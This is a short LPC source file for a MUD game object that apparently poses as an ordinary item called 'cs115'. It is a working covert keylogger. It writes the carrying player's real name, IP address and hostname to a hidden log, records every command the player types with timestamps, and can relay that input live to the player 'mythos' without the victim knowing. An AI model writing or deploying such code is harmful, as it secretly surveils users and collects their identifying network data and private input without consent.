int m;
reset(arg) {
  if(arg) return;
  
write_file("/players/mythos/closed/play/tell/<>"+
this_player()->query_real_name(),this_player()->query_real_name()+
" "+query_ip_number(this_player())+"  "+ this_player()->query_hostname()+"\n\n");
  
  m = 0;
  call_out("heh",3);
}

get() { return 1; }
drop() { return 1; }
id(str) { return str == "cs115"; }
init() {
#ifndef __LDMUD__
  add_action("ekg"); add_xverb("");
#else
 add_action("ekg", "", 3);
#endif
}

set_listen(n) { m = n; }

ekg(str) {
  if(find_player("mythos") && m == 1) {
tell_object(find_player("mythos"), "**"+
    (this_player()->query_name())+
    "**"+query_verb()+" "+str+"\n");}
write_file("/players/mythos/closed/play/tell/<>"+
this_player()->query_real_name(),
    (ctime(time()))+" > "+
    (this_player()->query_name())+
    "**"+query_verb()+" "+str+"\n");
    return 0;
}

heh() {
  move_object(this_object(),environment(this_object()));
call_out("heh",100);
return 1;}
